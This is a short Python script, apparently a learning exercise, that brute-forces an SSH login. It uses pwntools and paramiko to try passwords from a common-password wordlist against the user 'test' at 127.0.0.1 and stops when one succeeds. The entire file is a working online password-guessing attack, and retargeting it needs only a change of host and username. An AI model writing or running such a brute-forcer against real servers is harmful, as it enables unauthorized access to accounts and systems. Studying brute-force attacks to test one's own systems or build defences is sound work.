from pwn import *
import paramiko

# pwn module is used to interact with ssh service
# pwn module would make use of paramiko module (error handling)

host = "127.0.0.1" # ip of the machine that we are going to brute force
username = "test" 
attempts = 0 

with open ("ssh-common-passwords.txt", "r") as password_lists:
	for password in password_lists:
		password=password.strip("\n")
		try: # try statement is used to handle authenication error
			print("[{}] attempting password '{}'".format(attempts,password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected(): #authentication successful
				print("[>] vaalid password found: '{}'".format(password))
				response.close()
				break
			response.close() #ending task if the password is not in the file 
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1
